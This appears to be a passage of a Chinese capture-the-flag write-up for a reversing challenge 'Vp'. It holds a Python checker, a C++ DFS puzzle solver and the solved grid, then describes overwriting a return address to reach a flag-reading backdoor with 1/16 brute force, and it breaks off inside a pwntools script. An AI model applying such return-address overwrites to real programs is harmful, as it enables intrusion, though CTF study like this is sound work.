<h2 id="reverse"><a class="header-link" href="#reverse"></a>Reverse</h2>
<h3 id="vp"><a class="header-link" href="#vp"></a>Vp</h3>
<p>用fork实现的虚拟机 (todo)</p>
<pre class="hljs"><code>x = [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>,
     <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>,
     <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>,
     <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>,
     <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>,
     <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>,
     <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>,
     <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>,
     <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>,
     <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>]

check_data  = [[<span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>],
[<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>],
[<span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>],
[<span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>],
[<span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>], <span class="hljs-comment"># 6 down</span>
[<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>],
[<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>],
[<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>],
[<span class="hljs-number">1</span>, <span class="hljs-number">7</span>, <span class="hljs-number">3</span>],
[<span class="hljs-number">1</span>, <span class="hljs-number">9</span>, <span class="hljs-number">2</span>],
[<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>],
[<span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>],
[<span class="hljs-number">2</span>, <span class="hljs-number">9</span>, <span class="hljs-number">3</span>],
[<span class="hljs-number">2</span>, <span class="hljs-number">7</span>, <span class="hljs-number">3</span>],
[<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>],
[<span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>],
[<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>],
[<span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>],
[<span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>],
[<span class="hljs-number">3</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>]] <span class="hljs-comment"># 89 left</span>
idxs = []
cnt = <span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> check_data:
    choice = d[<span class="hljs-number">0</span>]
    m = d[<span class="hljs-number">1</span>]
    r = d[<span class="hljs-number">2</span>]
    <span class="hljs-keyword">if</span> choice == <span class="hljs-number">2</span>:
        step = <span class="hljs-number">1</span>
        idx = <span class="hljs-number">10</span> * m
    <span class="hljs-keyword">elif</span> choice == <span class="hljs-number">3</span>:
        step = -<span class="hljs-number">1</span>
        idx = <span class="hljs-number">10</span> * (m+<span class="hljs-number">1</span>) -<span class="hljs-number">1</span>
    <span class="hljs-keyword">elif</span> choice == <span class="hljs-number">0</span>:
        step = <span class="hljs-number">10</span>
        idx = m
    <span class="hljs-keyword">elif</span> choice == <span class="hljs-number">1</span>:
        step = -<span class="hljs-number">10</span>
        idx = <span class="hljs-number">10</span> * <span class="hljs-number">9</span> + m
    <span class="hljs-built_in">print</span>(step, idx)
    j = <span class="hljs-number">0</span>
    num = <span class="hljs-number">0</span>
    <span class="hljs-built_in">max</span> = -<span class="hljs-number">1</span>
    <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span>
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        <span class="hljs-keyword">if</span> j == <span class="hljs-number">10</span>:
            <span class="hljs-keyword">break</span>
        c = x[idx]
        <span class="hljs-comment"># print(c)</span>
        <span class="hljs-keyword">assert</span> <span class="hljs-number">1</span>&lt;=c&lt;=<span class="hljs-number">10</span>
        num |= (<span class="hljs-number">1</span> &lt;&lt; c-<span class="hljs-number">1</span>)
        <span class="hljs-keyword">if</span> c &gt; <span class="hljs-built_in">max</span>:
            <span class="hljs-built_in">max</span> = c
            <span class="hljs-built_in">sum</span> += <span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            idx += step
            j += <span class="hljs-number">1</span>
    <span class="hljs-comment"># print(num, sum)</span>
    <span class="hljs-comment"># print(1023, r)</span>
    <span class="hljs-keyword">if</span> num == <span class="hljs-number">1023</span>: <span class="hljs-comment"># 0b1111111111</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">sum</span> == r:
            cnt += <span class="hljs-number">1</span>
<span class="hljs-built_in">print</span>(cnt)
<span class="hljs-keyword">if</span> cnt == <span class="hljs-number">20</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;correct&quot;</span>)</code></pre><p>一种填字游戏</p>
<p>10*10的表，每一行为1-10，每一列为1-10</p>
<p>check某一行(或某一列)从左到右/从右到左(或从上到下/从下到上)最大值变化的次数为给定值</p>
<p>有点像数独</p>
<p>dfs搜索加剪枝</p>
<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstdio&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstdlib&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;algorithm&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unordered_set&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> N 10</span>

<span class="hljs-keyword">int</span> check_row[N];
<span class="hljs-keyword">int</span> check_col[N];

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init_check</span><span class="hljs-params">()</span>
</span>{
    <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> check_data[<span class="hljs-number">2</span> * N][<span class="hljs-number">3</span>] = {{<span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>}, {<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>}, {<span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>}, {<span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>}, {<span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>}, {<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>}, {<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>}, {<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>}, {<span class="hljs-number">1</span>, <span class="hljs-number">7</span>, <span class="hljs-number">3</span>}, {<span class="hljs-number">1</span>, <span class="hljs-number">9</span>, <span class="hljs-number">2</span>}, {<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>}, {<span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>}, {<span class="hljs-number">2</span>, <span class="hljs-number">9</span>, <span class="hljs-number">3</span>}, {<span class="hljs-number">2</span>, <span class="hljs-number">7</span>, <span class="hljs-number">3</span>}, {<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>}, {<span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>}, {<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>}, {<span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>}, {<span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>}, {<span class="hljs-number">3</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>}};

    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span> * N; ++i)
    {
        <span class="hljs-keyword">int</span> c = check_data[i][<span class="hljs-number">0</span>];
        <span class="hljs-keyword">int</span> m = check_data[i][<span class="hljs-number">1</span>];
        <span class="hljs-keyword">int</span> r = check_data[i][<span class="hljs-number">2</span>];
        <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (c)
        {
        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:
            check_col[m] = r;
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
            check_col[m] = -r;
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:
            check_row[m] = r;
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:
            check_row[m] = -r;
            <span class="hljs-keyword">break</span>;
        }
    }
}

vector&lt;vector&lt;<span class="hljs-keyword">int</span>&gt;&gt; perms[N+<span class="hljs-number">1</span>];

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">count_max</span><span class="hljs-params">(<span class="hljs-keyword">const</span> vector&lt;<span class="hljs-keyword">int</span>&gt; &amp;perm)</span>
</span>{
    <span class="hljs-keyword">int</span> mx = <span class="hljs-number">-1</span>;
    <span class="hljs-keyword">int</span> cnt = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> x : perm)
        <span class="hljs-keyword">if</span> (x &gt; mx) {
            mx = x;
            cnt++;
        }
    <span class="hljs-keyword">return</span> cnt;
}

vector&lt;vector&lt;<span class="hljs-keyword">int</span>&gt;&gt; perms_row[N], perms_col[N];
unordered_set&lt;<span class="hljs-keyword">int</span>&gt; avail_row[N], avail_col[N];

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init_perm</span><span class="hljs-params">()</span>
</span>{
    vector&lt;<span class="hljs-keyword">int</span>&gt; perm{<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>};
    <span class="hljs-keyword">do</span>
    {
        <span class="hljs-keyword">int</span> c = <span class="hljs-built_in">count_max</span>(perm);
        perms[c].<span class="hljs-built_in">push_back</span>(perm);
    } <span class="hljs-keyword">while</span> (<span class="hljs-built_in">next_permutation</span>(perm.<span class="hljs-built_in">begin</span>(), perm.<span class="hljs-built_in">end</span>()));

    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) {
        <span class="hljs-keyword">if</span> (check_row[i] &gt; <span class="hljs-number">0</span>)
            perms_row[i] = perms[check_row[i]];
        <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">for</span> (vector&lt;<span class="hljs-keyword">int</span>&gt; &amp;vec : perms[-check_row[i]])
                perms_row[i].<span class="hljs-built_in">push_back</span>(vector&lt;<span class="hljs-keyword">int</span>&gt;(vec.<span class="hljs-built_in">rbegin</span>(), vec.<span class="hljs-built_in">rend</span>()));
        }
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> j = <span class="hljs-number">0</span>; j &lt; perms_row[i].<span class="hljs-built_in">size</span>(); ++j)
            avail_row[i].<span class="hljs-built_in">insert</span>(j);
    }
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) {
        <span class="hljs-keyword">if</span> (check_col[i] &gt; <span class="hljs-number">0</span>)
            perms_col[i] = perms[check_col[i]];
        <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">for</span> (vector&lt;<span class="hljs-keyword">int</span>&gt; &amp;vec : perms[-check_col[i]])
                perms_col[i].<span class="hljs-built_in">push_back</span>(vector&lt;<span class="hljs-keyword">int</span>&gt;(vec.<span class="hljs-built_in">rbegin</span>(), vec.<span class="hljs-built_in">rend</span>()));
        }
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> j = <span class="hljs-number">0</span>; j &lt; perms_col[i].<span class="hljs-built_in">size</span>(); ++j)
            avail_col[i].<span class="hljs-built_in">insert</span>(j);
    }
}

<span class="hljs-keyword">int</span> board[N][N];
<span class="hljs-keyword">bool</span> done_row[N], done_col[N];

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">finish</span><span class="hljs-params">()</span>
</span>{
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) {
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; N; ++j)
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, board[i][j]);
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
    }
    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
}

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-keyword">int</span> has_set)</span>
</span>{
    <span class="hljs-keyword">int</span> row = <span class="hljs-number">-1</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i)
        <span class="hljs-keyword">if</span> (!done_row[i]) {
            <span class="hljs-keyword">if</span> (row == <span class="hljs-number">-1</span> || avail_row[row].<span class="hljs-built_in">size</span>() &gt; avail_row[i].<span class="hljs-built_in">size</span>())
                row = i;
        }
    <span class="hljs-keyword">if</span> (row == <span class="hljs-number">-1</span>)
        <span class="hljs-built_in">finish</span>();
    <span class="hljs-keyword">int</span> col = <span class="hljs-number">-1</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i)
        <span class="hljs-keyword">if</span> (!done_col[i]) {
            <span class="hljs-keyword">if</span> (col == <span class="hljs-number">-1</span> || avail_row[col].<span class="hljs-built_in">size</span>() &gt; avail_col[i].<span class="hljs-built_in">size</span>())
                col = i;
        }
    <span class="hljs-comment">//printf(&quot;has %d\n&quot;, has_set);</span>

    <span class="hljs-keyword">int</span> save[N], new_set = has_set;

    <span class="hljs-keyword">if</span> (avail_row[row].<span class="hljs-built_in">size</span>() &lt; avail_col[col].<span class="hljs-built_in">size</span>()) {
        <span class="hljs-comment">//printf(&quot;row %d\n&quot;, row);</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i)
            save[i] = board[row][i];
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i)
            <span class="hljs-keyword">if</span> (save[i] == <span class="hljs-number">0</span>)
                new_set++;

        done_row[row] = <span class="hljs-literal">true</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> perm_idx: avail_row[row]) {
            <span class="hljs-keyword">const</span> vector&lt;<span class="hljs-keyword">int</span>&gt; &amp;perm = perms_row[row][perm_idx];

            <span class="hljs-comment">/* set board */</span>
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i)
                board[row][i] = perm[i];

            <span class="hljs-comment">/* mark unavailable perms */</span>
            vector&lt;<span class="hljs-keyword">int</span>&gt; ban_row[N], ban_col[N];
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i)
                <span class="hljs-keyword">if</span> (!done_row[i]) {
                    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j: avail_row[i])
                        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>; k &lt; N; ++k)
                            <span class="hljs-keyword">if</span> (perms_row[i][j][k] == board[row][k]) {
                                ban_row[i].<span class="hljs-built_in">push_back</span>(j);
                                <span class="hljs-keyword">break</span>;
                            }
                    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j: ban_row[i])
                        avail_row[i].<span class="hljs-built_in">erase</span>(j);
                }
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i)
                <span class="hljs-keyword">if</span> (!done_col[i]) {
                    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j: avail_col[i])
                        <span class="hljs-keyword">if</span> (perms_col[i][j][row] != board[row][i])
                            ban_col[i].<span class="hljs-built_in">push_back</span>(j);
                    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j: ban_col[i])
                        avail_col[i].<span class="hljs-built_in">erase</span>(j);
                }

            <span class="hljs-built_in">dfs</span>(new_set);

            <span class="hljs-comment">/* revert available perms */</span>
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i)
                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j: ban_row[i])
                    avail_row[i].<span class="hljs-built_in">insert</span>(j);
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i)
                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j: ban_col[i])
                    avail_col[i].<span class="hljs-built_in">insert</span>(j);

            <span class="hljs-comment">/* revert board*/</span>
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i)
                board[row][i] = save[i];
        }
        done_row[row] = <span class="hljs-literal">false</span>;
    }
    <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">//printf(&quot;col %d\n&quot;, col);</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i)
            save[i] = board[i][col];
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i)
            <span class="hljs-keyword">if</span> (save[i] == <span class="hljs-number">0</span>)
                new_set++;

        done_col[col] = <span class="hljs-literal">true</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> perm_idx: avail_col[col]) {
            <span class="hljs-keyword">const</span> vector&lt;<span class="hljs-keyword">int</span>&gt; &amp;perm = perms_col[col][perm_idx];

            <span class="hljs-comment">/* set board */</span>
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i)
                board[i][col] = perm[i];

            <span class="hljs-comment">/* mark unavailable perms */</span>
            vector&lt;<span class="hljs-keyword">int</span>&gt; ban_row[N], ban_col[N];
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i)
                <span class="hljs-keyword">if</span> (!done_col[i]) {
                    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j: avail_col[i])
                        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>; k &lt; N; ++k)
                            <span class="hljs-keyword">if</span> (perms_col[i][j][k] == board[k][col]) {
                                ban_col[i].<span class="hljs-built_in">push_back</span>(j);
                                <span class="hljs-keyword">break</span>;
                            }
                    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j: ban_col[i])
                        avail_col[i].<span class="hljs-built_in">erase</span>(j);
                }
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i)
                <span class="hljs-keyword">if</span> (!done_row[i]) {
                    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j: avail_row[i])
                        <span class="hljs-keyword">if</span> (perms_row[i][j][col] != board[i][col])
                            ban_row[i].<span class="hljs-built_in">push_back</span>(j);
                    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j: ban_row[i])
                        avail_row[i].<span class="hljs-built_in">erase</span>(j);
                }

            <span class="hljs-built_in">dfs</span>(new_set);

            <span class="hljs-comment">/* revert available perms */</span>
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i)
                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j: ban_row[i])
                    avail_row[i].<span class="hljs-built_in">insert</span>(j);
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i)
                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j: ban_col[i])
                    avail_col[i].<span class="hljs-built_in">insert</span>(j);

            <span class="hljs-comment">/* revert board*/</span>
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i)
                board[i][col] = save[i];
        }
        done_col[col] = <span class="hljs-literal">false</span>;
    }
}

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
</span>{
    <span class="hljs-built_in">init_check</span>();
    <span class="hljs-built_in">init_perm</span>();
    <span class="hljs-built_in">dfs</span>(<span class="hljs-number">0</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
x = [<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">10</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,
<span class="hljs-number">2</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">9</span>,<span class="hljs-number">4</span>,<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,
<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">10</span>,<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">5</span>,
<span class="hljs-number">5</span>,<span class="hljs-number">10</span>,<span class="hljs-number">7</span>,<span class="hljs-number">9</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">6</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">1</span>,
<span class="hljs-number">7</span>,<span class="hljs-number">6</span>,<span class="hljs-number">10</span>,<span class="hljs-number">8</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>,
<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">5</span>,<span class="hljs-number">10</span>,<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,
<span class="hljs-number">10</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">7</span>,<span class="hljs-number">3</span>,<span class="hljs-number">8</span>,
<span class="hljs-number">6</span>,<span class="hljs-number">5</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,
<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,
<span class="hljs-number">8</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,
]</code></pre><p>算对结束后有个写地址的功能，可以写code+0x10000内的两个字节，后门函数就是读flag （后门sub_CC8）</p>
<p class="img-container"><img src="./pngs/vp.png" alt="img"></p>
<p>调试一下发现返回地址和数据的偏移为39312。需要爆破1/16后门地址。多试几次就出来了</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
x = [<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">10</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,
<span class="hljs-number">2</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">9</span>,<span class="hljs-number">4</span>,<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,
<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">10</span>,<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">5</span>,
<span class="hljs-number">5</span>,<span class="hljs-number">10</span>,<span class="hljs-number">7</span>,<span class="hljs-number">9</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">6</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">1</span>,
<span class="hljs-number">7</span>,<span class="hljs-number">6</span>,<span class="hljs-number">10</span>,<span class="hljs-number">8</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>,
<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">5</span>,<span class="hljs-number">10</span>,<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,
